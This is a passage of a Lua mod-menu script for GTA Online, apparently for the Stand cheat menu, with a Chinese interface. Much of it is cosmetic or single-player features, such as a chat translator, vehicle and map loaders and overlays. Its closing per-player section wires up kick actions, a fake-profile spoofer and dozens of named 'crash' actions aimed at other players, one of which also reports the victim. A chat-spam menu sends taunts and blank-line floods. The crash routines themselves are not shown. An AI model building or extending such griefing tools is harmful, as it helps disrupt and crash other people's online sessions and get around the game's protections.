    only_translate_foreign = on
end, true)

local players_on_cooldown = {}

chat.on_message(function(sender, reserved, text, team_chat, networked, is_auto)
    if do_translate and networked and players.user() ~= sender then
        local encoded_text = encode_for_web(text)
        local player_lang = language_codes_by_enum[players.get_language(sender)]
        local player_name = players.get_name(sender)
        if only_translate_foreign and player_lang == my_lang then
            return
        end
        -- credit to the original chat translator for the api code
        local translation
        if players_on_cooldown[sender] == nil then
            async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl=" .. iso_my_lang .."&dt=t&q=".. encoded_text, function(data)
		    	translation, original, source_lang = data:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
                if source_lang == nil then 
                    util.toast("无法翻译 来自 " .. player_name)
                    return
                end
                players_on_cooldown[sender] = true
                if get_iso_version_of_lang(source_lang) ~= iso_my_lang then
                    chat.send_message(string.gsub(player_name .. ': \"' .. translation .. '\"', "%+", " "), team_chat, true, false)
                end
                util.yield(1000)
                players_on_cooldown[sender] = nil
		    end, function()
                util.toast("无法翻译 来自 " .. player_name)
            end)
		    async_http.dispatch()
        else
            util.toast(player_name .. "发送了一条信息,在翻译的冷却时间内. 如果该玩家在聊天中乱发垃圾信息，请考虑踢掉他，以防止被谷歌翻译暂时停止.")
        end
    end
end)
    
    chatspamtrash = menu.list(GPB, "刷屏")

    menu.action(chatspamtrash, "作死", {""}, "", function()
    chat.send_message("U CANT CRASH 2stand1 HomerLuaScript USER XD",false,true,true)
    end)
    menu.action(chatspamtrash, "踢出广告", {""}, "", function()
     chat.send_message("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n-------baibai--------\n已为您自动踢出广告机\n----------OvO----------",false,true,true)
    end)
    menu.action(chatspamtrash, "ikun", {""}, "", function()
    chat.send_message("故人西辞黄鹤楼,唱跳Rap打篮球\n 春风又绿江南岸,练习长达两年半\n清明时节雨坤坤,路上行人梳中分\n借问背带何处有,牧童遥指练习生",false,true,true)
    end)

local sc = menu.list(menu.my_root(), "生成选项")

menu.divider(sc, "载具")

menu.action(sc, "搜索载具模组", {"lssearchv"}, "", function(click_type)
    menu.show_command_box("lssearchv" .. " ")
    end, function(on_command)
        local results = search_vehicle(on_command)
        if #results == 0 then 
            util.toast("无搜索结果 :(")
        else
            menu.set_list_action_options(v_search_results_action, results)
            menu.trigger_commands("lsvsearchresults")
        end
end)

load_vehicle_action = menu.list_action(sc, "加载模组载具", {}, "加载载具. " .. instruction_text, all_vehicles, function(index, value)
    local path = vehicles_dir .. '\\' .. value
    if util.is_key_down(0x10) and util.is_key_down(0x11) then
        os.remove(path)
        util.toast(value .. " 已删除! :)")
        get_all_vehicles_in_dir()
    elseif util.is_key_down(0x20) then 
        favorite_vehicle(value)
    else
        load_vehicle(vehicles_dir .. '\\' .. value)
    end
end)

loaded_vehicles_root = menu.list(sc, "已加载的载具", {"lancespoonerloadedvehicles"}, "你已经加载的载具")

menu.divider(sc, "地图")
menu.action(sc, "搜索地图模组", {"lssearchmap"}, "", function(click_type)
    menu.show_command_box("lssearchmap" .. " ")
    end, function(on_command)
        local results = search_map(on_command)
        if #results == 0 then 
            util.toast("无搜索结果 :(")
        else
            menu.set_list_action_options(m_search_results_action, results)
            menu.trigger_commands("lsmsearchresults")
        end
end)

load_map_action = menu.list_action(sc, "加载XML地图", {}, "加载地图. " .. instruction_text, all_maps, function(index, value)
    local path = maps_dir .. '\\' .. value
    if util.is_key_down(0x10) and util.is_key_down(0x11) then
        os.remove(path)
        util.toast(value .. " 已删除! :)")
        get_all_maps_in_dir()
    elseif util.is_key_down(0x20) then 
        favorite_map(value)
    else
        load_map(path)
    end
end)
loaded_maps_root = menu.list(sc, "已加载的地图", {"lancespoonerloadedmaps"}, "你已经加载的地图")


menu.divider(sc, "收藏夹")

local load_favorite_vehicle_action = menu.list_action(sc, "最爱的载具", {}, "加载载具.", favorite_vehicles, function(index, value)
    load_vehicle(vehicles_dir .. '\\' .. value)
end)

local load_favorite_map_action = menu.list_action(sc, "最爱的地图", {}, "加载地图.", favorite_maps, function(index, value)
    load_map(maps_dir .. '\\' .. value)
end)


menu.divider(sc, "杂项")
v_search_results = {}
v_search_results_action = menu.list_action(sc, "载具搜索结果", {"lsvsearchresults"}, "", v_search_results, function(index, value)
    local path = vehicles_dir .. '\\' .. value
    load_vehicle(path)
end)

m_search_results = {}
m_search_results_action = menu.list_action(sc, "地图搜索结果", {"lsmsearchresults"}, "", m_search_results, function(index, value)
    local path = maps_dir .. '\\' .. value
    menyoo_load_map(path)
end)

function get_all_maps_in_dir()
    local temp_maps = {}
    local temp_favorite_maps = {}
    for i, path in ipairs(filesystem.list_files(maps_dir)) do
        if string.match(path:gsub(maps_dir, ''), '.xml') then
            temp_maps[#temp_maps + 1] = path:gsub(maps_dir, '')
            if string.startswith(path:gsub(maps_dir, ''), '[F]') then 
                temp_favorite_maps[#temp_favorite_maps+1] = path:gsub(maps_dir, '')
            end
        end
    end


    all_maps = temp_maps
    favorite_maps = temp_favorite_maps
    menu.set_list_action_options(load_map_action, all_maps)
    menu.set_list_action_options(load_favorite_map_action, favorite_maps)
end

function get_all_vehicles_in_dir()
    local temp_vehicles = {}
    local temp_favorite_vehicles = {}
    local temp_favorite_maps = {}
    local supported_formats = {'.xml', '.ini', '.json'}
    for i, path in ipairs(filesystem.list_files(vehicles_dir)) do
        for _, fmt in pairs(supported_formats) do 
            if string.match(path:gsub(vehicles_dir, ''), fmt) then
                temp_vehicles[#temp_vehicles + 1] = path:gsub(vehicles_dir, '')
                if string.startswith(path:gsub(vehicles_dir, ''), '[F]') then 
                    temp_favorite_vehicles[#temp_favorite_vehicles+1] = path:gsub(vehicles_dir, '')
                end
            end
        end
    end

    all_vehicles = temp_vehicles
    favorite_vehicles = temp_favorite_vehicles
    menu.set_list_action_options(load_vehicle_action, all_vehicles)
    menu.set_list_action_options(load_favorite_vehicle_action, favorite_vehicles)
end

get_all_vehicles_in_dir()
get_all_maps_in_dir()

util.create_thread(function()
    while true do
        get_all_vehicles_in_dir()
        get_all_maps_in_dir()
        util.yield(5000)
    end
end)


local lobbyFeats = menu.list(menu.my_root(), "世界选项", {}, "")

local colouroverlyasd = menu.list(lobbyFeats, '颜色覆盖', {}, '')

local colourOverlay = new.colour( 0, 0, 10, 0.1 )

menu.toggle_loop(colouroverlyasd, '颜色覆盖', {'JScolourOverlay'}, '在游戏上应用颜色过滤器.', function()
    directx.draw_rect(0, 0, 1, 1, colourOverlay)
end)

menu.rainbow(menu.colour(colouroverlyasd   , '设置覆盖颜色', {'JSoverlayColour'}, '', colourOverlay, true, function(colour)
    colourOverlay = colour
end))

    local trainsasd = menu.list(lobbyFeats, '火车', {'JStrains'}, '')

    local trainsStopped = false
    local function stopTrain(train)
        util.create_thread(function()
            while trainsStopped do
                VEHICLE.SET_TRAIN_SPEED(train, -0.05)
                util.yield()
            end
            VEHICLE.SET_RENDER_TRAIN_AS_DERAILED(train, false)
        end)
    end

    menu.toggle(trainsasd, '火车脱轨', {'JSderail'}, '使所有火车脱轨并停止.', function(toggle)
        local vehPointers = entities.get_all_vehicles_as_pointers()
        trainsStopped = toggle
        for i = 1, #vehPointers do
            local vehHash = entities.get_model_hash(vehPointers[i])
            if VEHICLE.GET_VEHICLE_CLASS_FROM_NAME(vehHash) == 21 then
                local trainHandle = entities.pointer_to_handle(vehPointers[i])
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(trainHandle)
                VEHICLE.SET_RENDER_TRAIN_AS_DERAILED(trainHandle, true)
                stopTrain(trainHandle)
            end
        end
    end)

    menu.action(trainsasd, '删除火车', {'JSdeleteTrain'}, '只是因为每个脚本都有火车选项,我必须也有一个反火车选项.', function()
        VEHICLE.DELETE_ALL_TRAINS()
    end)

    local markedTrains = {}
    local markedTrainBlips = {}
    menu.toggle_loop(trainsasd, '标记附近的火车', {'JSnoMapNotifications'}, '用紫色光点标记附近的火车.', function()
        local vehPointers = entities.get_all_vehicles_as_pointers()
        removeValues(vehPointers, markedTrains)

        for i = 1, #vehPointers do
            local vehHash = entities.get_model_hash(vehPointers[i])
            if VEHICLE.GET_VEHICLE_CLASS_FROM_NAME(vehHash) == 21 then
                if notifications then
                    util.toast('Marked train')
                end
                table.insert(markedTrains, vehPointers[i])
                local blip = HUD.ADD_BLIP_FOR_ENTITY(entities.pointer_to_handle(vehPointers[i]))
                HUD.SET_BLIP_COLOUR(blip, 58)
                table.insert(markedTrainBlips, blip)
            end
        end
        util.yield(100)
    end, function()
        for i = #markedTrainBlips, 1, -1 do
            util.remove_blip(markedTrainBlips[i])
            markedTrainBlips[i] = nil
            markedTrains[i] = nil
        end
    end)

    local pedsasd = menu.list(lobbyFeats, 'NPC', {'JSpeds'}, '')

    
    for i = 1, #pedToggleLoops do
        menu.toggle_loop(pedsasd, pedToggleLoops[i].name, {pedToggleLoops[i].command}, pedToggleLoops[i].description, function()
            local pedHandles = entities.get_all_peds_as_handles()
            for j = 1, #pedHandles do
                pedToggleLoops[i].action(pedHandles[j])
            end
            util.yield(10)
        end, function()
            if pedToggleLoops[i].onStop then pedToggleLoops[i].onStop() end
        end)
    end

    menu.toggle_loop(pedsasd, '杀死车主', {'JSkillJackedPeds'}, '抢车的时候自动杀死驾驶载具的NPC', function(toggle)
        if not PED.IS_PED_JACKING(players.user_ped()) then return end
        local jackedPed = PED.GET_JACK_TARGET(players.user_ped())
        util.yield(100)
        ENTITY.SET_ENTITY_HEALTH(jackedPed, 0, 0)
    end)

    menu.toggle(pedsasd, '暴动模式', {'JSriot'}, '使附近的NPC充满敌意.', function(toggle)
        MISC.SET_RIOT_MODE_ENABLED(toggle)
    end)


local qiuqiu = {"生成", "删除"}
menu.list_action(lobbyFeats, "球体", {}, "在花园银行顶部生成一个球体", qiuqiu, function(index, value, click_type)
    pluto_switch index do
        case 1:
        aball()
        break
        case 2:
        shanqiu()
    end
end)

local hudminimap = menu.list(lobbyFeats, "小地图")

menu.slider(hudminimap, '地图缩放级别', {'JSmapZoom'}, '', 1, 100, mapZoom, 1, function(value)
    Zoom_map(value)
end)

mapangle = 0
menu.slider(hudminimap,"小地图角度", {"minimapanglme"}, "", 0, 360, 0, 1, function(s)
    mapangle = s
end)

mapanglet = off
menu.toggle(hudminimap,"锁定地图角度", {"lockminimapangle"}, "", function(on)
	mapanglet = on
	while mapanglet do
		HUD.LOCK_MINIMAP_ANGLE(mapangle)
		util.yield()
	end
	HUD.UNLOCK_MINIMAP_ANGLE()
end)


menu.toggle(hudminimap,"显示声呐", {"sonaronmap"}, "", function(on)
	HUD.SET_MINIMAP_SONAR_SWEEP(on)
end)

centermap = off
menu.toggle(hudminimap, "以你为中心的地图", {"centermap"}, "", function(on)
	centermap = on
	while centermap do 
		HUD.DONT_TILT_MINIMAP_THIS_FRAME()
		util.yield()
	end
end)


local fireworks_root = menu.list(lobbyFeats, "烟花", {}, "")

menu.action(fireworks_root, "放烟花盒", {"placefireworks"}, "模仿已删除的线上功能-放置烟花盒", function(click_type)
    placefirework()
end)

menu.action(fireworks_root, "放烟花", {"kaboom"}, "点燃所有放好的烟花。", function(click_type)
    fireworkshow()
end)

meteors = false
menu.toggle(lobbyFeats, "一起看流星", {""}, "", function(on)
    if on then
        meteors = true
        start_meteor_shower()
    else
        meteors = false
    end
end, false)

island_block = 0
menu.action(lobbyFeats, "天空岛", {""}, "", function(on_click)
    local c = {}
    c.x = 0
    c.y = 0
    c.z = 500
    PED.SET_PED_COORDS_KEEP_VEHICLE(players.user_ped(), c.x, c.y, c.z+5)
    if island_block == 0 or not ENTITY.DOES_ENTITY_EXIST(island_block) then
        request_model_load(1054678467)
        island_block = entities.create_object(1054678467, c)
    end
end)

menu.toggle_loop(lobbyFeats, "闪电生成", {""}, "", function()
    MISC.FORCE_LIGHTNING_FLASH()
end)

menu.toggle_loop(lobbyFeats, "外星人入侵", {}, "", function(toggle)
    ufffo()
end)

menu.toggle(lobbyFeats, "安全的战局", {}, "全战局幽灵", function(on)
	if on then
		for pid = 0,30 do
			if players.exists(pid) then
				NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid,true)
			end
		end
	else
		for pid = 0,30 do
			if players.exists(pid) then
				NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid,false)
			end
		end
	end 
end)

menu.toggle_loop(lobbyFeats, "跳跳车", {}, '', function(toggle)
    carjump()
end)

    menu.toggle(lobbyFeats, '同步时间', {'JSirlTime'}, '使游戏时间与您的现实时间相匹配. 请禁用Stand的时间 "平滑过渡".', function(toggle)
        iri_time(toggle)
    end)

    menu.toggle_loop(lobbyFeats, '禁用小键盘', {'JSdisableNumpad'}, '禁用小键盘,因此您在操作Stand时不会旋转您的飞机/潜艇', function()
        disableNumpad()
    end)

    menu.toggle(lobbyFeats, '启用脚印', {'JSfootSteps'}, '在所有表面上留下脚印.', function(toggle)
        GRAPHICS.USE_SNOW_FOOT_VFX_WHEN_UNSHELTERED(toggle)
    end)

    menu.toggle(lobbyFeats, '启用车辆轨迹', {'JSvehicleTrails'}, '在所有表面上留下车辆的轨迹.', function(toggle)
        GRAPHICS.USE_SNOW_WHEEL_VFX_WHEN_UNSHELTERED(toggle)
    end)

    menu.toggle_loop(lobbyFeats, '禁用所有地图通知', {'JSnoMapNotifications'}, '自动删除那些不断发送的通知', function()
        HUD.THEFEED_HIDE_THIS_FRAME()
    end)

HCFolderDir = filesystem.scripts_dir() .. "/baibaiScript/" .. '/Heist Control/'

Heist_Control = menu.list(menu.my_root(), "任务选项")

Heist_Control_Load = menu.action(Heist_Control, "加载任务选项", {""}, "", function()

notification("正在加载任务脚本,请稍等",colors.blue)
util.yield(2000)
    require "lib.libliblib.Heist Control"
    menu.delete(Heist_Control_Load)
end)

Musiness_Banager = menu.list(menu.my_root(), "自动资产")

Musiness_Banager_Load = menu.action(Musiness_Banager, "加载自动资产", {""}, "", function()

notification("正在加载自动资产,请稍等",colors.blue)
util.yield(2000)
    require "lib.libliblib.MusinessBanager"
    menu.delete(Musiness_Banager_Load)
end)

Constructor_Lua = menu.list(menu.my_root(), "模型选项")

Constructor_Lua_Load = menu.action(Constructor_Lua, "加载模型选项", {""}, "", function()

notification("正在加载模型脚本,请稍等",colors.blue)
util.yield(2000)
    require "lib.libliblib.Constructor.Constructor"
    menu.delete(Constructor_Lua_Load)
end)


toolFeats = menu.list(menu.my_root(), "拓展选项", {}, "", function(); end)

menu.action(toolFeats, "平滑瞬移", {"stp"}, "在相机平稳的情况下将您传送到您的航点。", function ()
    SmoothTeleportToCord(Get_Waypoint_Pos2(), FRAME_STP)
end)

menu.toggle(toolFeats, "平滑传送帧(v2)", {"stpv2"}, "使您或您的车辆与相机一起传送，以实现“更顺畅”的传送。", function(toggle)
    FRAME_STP = toggle
end)

menu.action(toolFeats, "重置相机", {"resetstp"}, "将脚本 cam 渲染为 false，同时销毁当前 cam。 因为如果你传送到海里，然后相机就死了。", function ()
    local renderingCam = CAM.GET_RENDERING_CAM()
    CAM.RENDER_SCRIPT_CAMS(false, false, 0, true, true, 0)
    CAM.DESTROY_CAM(renderingCam, true)
end)

local stpsettings = menu.list(toolFeats, "平滑TP设置", {}, "")

menu.slider(stpsettings, "速度修改器（x）/10", {"stpspeed"}, "用于平滑 tp 的速度修改器，乘法。 这将除以 10，因为滑块不能采用非整数", 1, 100, 10, 1, function(value)
    local multiply = value / 10
    if SE_Notifications then
        util.toast("SmoothTP 速度倍增器设置为 " .. tostring(multiply) .. "!")
    end
    STP_SPEED_MODIFIER = 0.02 --set it again so it doesnt multiply over and over. This took too long to figure out....
    STP_SPEED_MODIFIER = STP_SPEED_MODIFIER * multiply
end)

menu.slider(stpsettings, "凸轮过渡的高度（米）", {"stpheight"}, "在进行过渡时设置相机的高度。", 0, 10000, 300, 10, function (value)
    local height = value
    if SE_Notifications then
        util.toast("SmoothTP 高度设置为 " .. tostring(height) .. "!")
    end
    STP_COORD_HEIGHT = height
end)

menu.divider(toolFeats, "-=-=-=-绘制-=-=-=-")


menu.toggle_loop(toolFeats, "绘制位置", {"drawpos"},  "", function ()
    local pos = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
    local cc = {r = 1.0, g = 1.0, b = 1.0, a = 1.0}
    directx.draw_text(0.0, 0.0, "x: " .. pos.x .. " // y: " .. pos.y .. " // z: " .. pos.z, ALIGN_TOP_LEFT, DR_TXT_SCALE, cc, false)
end)

menu.toggle_loop(toolFeats, "绘制旋转", {"drawrot"}, "", function ()
    local rot = ENTITY.GET_ENTITY_ROTATION(GetLocalPed(), 2)
    local cc = {r = 1.0, g = 1.0, b = 1.0, a = 1.0}
    directx.draw_text(0.5, 0.03, "pitch: " .. rot.x .. " // roll: " .. rot.y .. " // yaw: " .. rot.z, ALIGN_CENTRE, DR_TXT_SCALE, cc, false)
    local facingtowards
    if ((rot.z >= 135) or (rot.z < -135)) then facingtowards = "-Y"
    elseif ((rot.z < 135) and (rot.z >= 45)) then facingtowards = "-X"
    elseif ((rot.z >= -135) and (rot.z < -45)) then facingtowards = "+X"
    elseif ((rot.z >= -45) or (rot.z < 45)) then facingtowards = "+Y" end
    directx.draw_text(0.5, 0.07, "Facing towards " .. facingtowards, ALIGN_CENTRE, DR_TXT_SCALE, cc, false)
end)

menu.toggle_loop(toolFeats, "绘制实体池", {"drawentpool"}, "", function ()
    local cc = {r = 1.0, g = 1.0, b = 1.0, a = 1.0}
    if EP_drawveh then
        local vehpool = entities.get_all_vehicles_as_pointers()
        directx.draw_text(EPS_vehx, EPS_vehy, "车辆," .. #vehpool, ALIGN_TOP_LEFT, DR_TXT_SCALE, cc, false)
    end
    if EP_drawped then
        local pedpool = entities.get_all_peds_as_pointers()
        directx.draw_text(EPS_pedx, EPS_pedy, "行人," .. #pedpool, ALIGN_TOP_LEFT, DR_TXT_SCALE, cc, false)
    end
    if EP_drawobj then
        local objpool = entities.get_all_objects_as_pointers()
        directx.draw_text(EPS_objx, EPS_objy, "物体," .. #objpool, ALIGN_TOP_LEFT, DR_TXT_SCALE, cc, false)
    end
    if EP_drawpick then
        local pickpool = entities.get_all_pickups_as_pointers()
        directx.draw_text(EPS_pickx, EPS_picky, "取货," .. #pickpool, ALIGN_TOP_LEFT, DR_TXT_SCALE, cc, false)
    end
end)

local ePS = menu.list(toolFeats,"实体池设置", {}, "")
menu.toggle(ePS, "绘制车辆", {}, "", function (toggle)
    EP_drawveh = toggle
end, true)
menu.slider(ePS, "车辆文字摆放X", {"epvehposx"}, "/100", 0, 100, 0, 1, function (value)
    EPS_vehx = value / 100
end) 
menu.slider(ePS, "车辆文字摆放Y", {"epvehposy"}, "/100", 0, 100, 3, 1, function (value)
    EPS_vehy = value / 100
end)
menu.toggle(ePS, "绘制行人", {}, "", function (toggle)
    EP_drawped = toggle
end, true)
menu.slider(ePS, "Ped 文本放置 X", {"eppedposx"}, "/100", 0, 100, 0, 1, function (value)
    EPS_pedx = value / 100
end)
menu.slider(ePS, "Ped 文本放置 Y", {"eppedposy"}, "/100", 0, 100, 5, 1, function (value)
    EPS_pedy = value / 100
end)
menu.toggle(ePS, "绘制物体", {}, "", function (toggle)
    EP_drawobj = toggle
end, true)
menu.slider(ePS, "物体文字放置X", {"epobjposx"}, "/100", 0, 100, 0, 1, function (value)
    EPS_objx = value / 100
end)
menu.slider(ePS, "物体文字位置Y", {"epobjposy"}, "/100", 0, 100, 7, 1, function (value)
    EPS_objy = value / 100
end)
menu.toggle(ePS, "绘制拾音器", {}, "", function (toggle)
    EP_drawpick = toggle
end, true)
menu.slider(ePS, "拾取文本放置X拾取文本放置Y绘制拾取", {"epickjposx"}, "/100", 0, 100, 0, 1, function (value)
    EPS_pickx = value / 100
end)
menu.slider(ePS, "拾取文本位置Y", {"epickjposy"}, "/100", 0, 100, 9, 1, function (value)
    EPS_picky = value / 100
end)

menu.divider(toolFeats, "设置")

menu.slider(toolFeats, "文本大小（/10）", {"drscale"}, "将文本的比例设置为您指定的值，除以 10。这是因为它只采用整数值。", 1, 50, 5, 1, function (value)
    DR_TXT_SCALE = value / 10
end)

local other_options = menu.list(menu.my_root(), "其他选项")

menu.toggle_loop(other_options, "主机序列", {"hostqu"}, "", function()
    scripthost()
end)

local renderwindow = false
local infoverlay = menu.list(other_options, "玩家信息", {}, '', 
function()
    renderwindow = true 
end, 
function()
    renderwindow = false
end)

menu.divider(infoverlay, '位置')

menu.slider_float(infoverlay, 'X:', {'overlayx'}, '信息覆盖的水平位置.', 0, 1000, 0, 1, function(s)
    guix = s/1000
end)
menu.slider_float(infoverlay, 'Y:', {'overlayy'}, '信息覆盖的垂直位置.', 0, 1000, 0, 1, function(s)
    guiy = s/1000
end)

menu.divider(infoverlay, '外观')

local colours = menu.list(infoverlay, '叠加颜色', {}, '')

menu.divider(colours, '元素')

menu.colour(colours, '标题栏颜色', {'overlaytitlebar'}, '标题栏的颜色.', colour_map.titlebar, true, function(on_change)
    colour_map.titlebar = on_change
end)
menu.colour(colours, '背景色', {'overlaybg'}, '背景颜色.', colour_map.background, true, function(on_change)
    colour_map.background = on_change
end)
menu.colour(colours, '生命条颜色', {'overlayhealthbar'}, '生命条的颜色.', colour_map.healthbar, true, function(on_change)
    colour_map.healthbar = on_change
end)
menu.colour(colours, '护甲条颜色', {'overlayarmourbar'}, '护甲条的颜色.', colour_map.armourbar, true, function(on_change)
    colour_map.armourbar = on_change
end)
menu.colour(colours, '光点颜色', {'overlayblip'}, '地图光点的颜色.', colour_map.blip, true, function(on_change)
    colour_map.blip = on_change
end)

menu.divider(colours, '文本')

menu.colour(colours, '名称颜色', {'overlayname'}, '玩家名字文字的颜色.', colour_map.name, true, function(on_change)
    colour_map.name = on_change
end)
menu.colour(colours, '标签颜色', {'overlaylabel'}, '标签文本的颜色.', colour_map.label, true, function(on_change)
    colour_map.label = on_change
end)
menu.colour(colours, '信息颜色', {'overlayinfo'}, '信息文本的颜色.', colour_map.info, true, function(on_change)
    colour_map.info = on_change
end)

local elementdim = menu.list(infoverlay, '元素大小和间距', {}, '')

menu.divider(elementdim, '元素大小和间距')

menu.slider(elementdim, '标题栏高度', {}, '标题栏的高度.', 0, 100, 22, 1, function(on_change)
    nameh = on_change/1000
end)
menu.slider(elementdim, '叠加宽度', {}, '文本窗口的宽度减去填充.', 0, 50, 16, 1, function(on_change)
    textw = on_change/100
end)
menu.slider(elementdim, '填充', {}, '在信息文本周围填充.', 0, 30, 8, 1, function(on_change)
    padding = on_change/1000
end)
menu.slider(elementdim, '间距', {}, '不同元素的间距.', 0, 20, 3, 1, function(on_change)
    spacing = on_change/1000
end)

local textdim = menu.list(infoverlay, '文本大小和间距', {}, '')

menu.divider(textdim, '文本大小和间距')

menu.slider_float(textdim, '名称', {}, '玩家名称文本的大小.', 0, 100, 52, 1, function(on_change)
    namesize = on_change/100
end)
menu.slider_float(textdim, '信息文本', {}, '信息文本的大小.', 0, 100, 41, 1, function(on_change)
    textsize = on_change/100
end)
menu.slider(textdim, '行间距', {}, '信息文本行之间的间距.', 0, 100, 32, 1, function(on_change)
    linespacing = on_change/10000
end)

local border = menu.list(infoverlay, '边框', {}, '')

menu.divider(border, '边框设置')

menu.slider(border, '宽度', {}, '元素周围呈现的边框宽度.', 0, 20, 0, 1, function(on_change)
    borderwidth = on_change/1000
end)
local colourborder = menu.colour(border, '颜色', {'overlayborder'}, '渲染边框的颜色.', colour_map.border, true, function(on_change)
    colour_map.border = on_change
end)
menu.rainbow(colourborder)

menu.slider(infoverlay, '背景模糊', {}, '应用于背景的模糊量.', 0, 255, 4, 1, function(on_change)
    blurstrength = on_change
end)

menu.toggle_loop(other_options, "跳到下一条对话", {}, "", function()
    if AUDIO.IS_SCRIPTED_CONVERSATION_ONGOING() then
        AUDIO.SKIP_TO_NEXT_SCRIPTED_CONVERSATION_LINE()
    end
end)

util.yield(1000)

GenerateFeatures = function(PlayerID)
    menu.divider(menu.player_root(PlayerID), "白白脚本")

	menu.action(menu.player_root(PlayerID), "创建虚假配置文件", {}, "", function ()
        playerspooffile(PlayerID)
	end)

        PlayerMainMenu = menu.list(menu.player_root(PlayerID), "移除", {"baibairemove"}, "", function(); end)

------------------------------------
-------------玩家踢出---------------
------------------------------------
        menu.divider(PlayerMainMenu, "踢出功能")

     
            menu.action(PlayerMainMenu, "阻止加入踢", {"blast"}, "将他们踢出并加入到阻止加入列表上", function()
                blockjoinkick(PlayerID)
            end)
        
            if menu.get_edition() >= 2 then 
                menu.action(PlayerMainMenu, "智能踢", {"adaptivekick"}, "", function()
                    autokickv1(PlayerID)
                end)
            else
                menu.action(PlayerMainMenu, "智能踢", {"adaptivekick"}, "", function()
                    autokickv2(PlayerID)
                end)
            end

------------------------------------
-------------玩家崩溃---------------
------------------------------------
    menu.divider(PlayerMainMenu, "崩溃功能")

    local toxic_chat_crash = menu.list(PlayerMainMenu, "嘲讽崩溃")

    menu.action(toxic_chat_crash, "橙子口嗨崩溃", {}, "遇事不决就用橙子口嗨崩", function()
        orangescrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, "阿饼崩溃", {}, "遇事不决就用阿饼崩", function()
        cookiecrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, "可乐崩溃", {}, "遇事不决就用可乐崩", function()
        colacrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, "白白崩溃", {}, "遇事不决就用白白崩", function()
        baibaicrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, "封号崩溃", {}, "崩溃同时举报他(会卡帧)", function()
        bancrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, "Jason崩溃", {}, "遇事不决就用Jason崩", function()
        jasoncrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, "街角EternityHurt", {}, "遇事不决就用街角EternityHurt崩", function()
        EternityHurtcrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, "趙先生躺平崩溃", {}, "遇事不决就用趙先生躺平溃崩", function()
        caocrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, "小涛崩溃", {}, "遇事不决就用小涛溃崩", function()
        shcrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, "长情崩溃", {}, "遇事不决就用长情溃崩", function()
        lovecrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, "箱根冲冲人崩溃", {}, "遇事不决就用箱根冲冲人溃崩", function()
        boxcrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, "帅比昊崩溃", {}, "遇事不决就用帅比昊崩溃", function()
        handsomecrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, "双叶崩溃", {}, "遇事不决就用双叶崩溃", function()
        futabacrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, "等天黑崩", {}, "遇事不决就用等天黑崩", function()
        waitnightcrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, "XYY崩", {}, "遇事不决就用XYY崩", function()
        xyycrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '妖姬崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, 'KLasombra崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '辉辉崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '箱根神秘人崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '訷話崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '晚风崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '黑子崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '枫川崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '河中石兽崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, 'Arzzz崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '大鸡吧崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '大壮康玉成17666崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, 'Y崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '小卡拉米崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '揣测崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '颜汐崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, 'yy崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '陵毅SAMA崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '简单才会快乐崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '邹城卡拉米崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, 'Arc崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '小葡萄崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '老杨崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '是爲山河故人崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '困死了崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, 'ikun崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, 'L建华崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

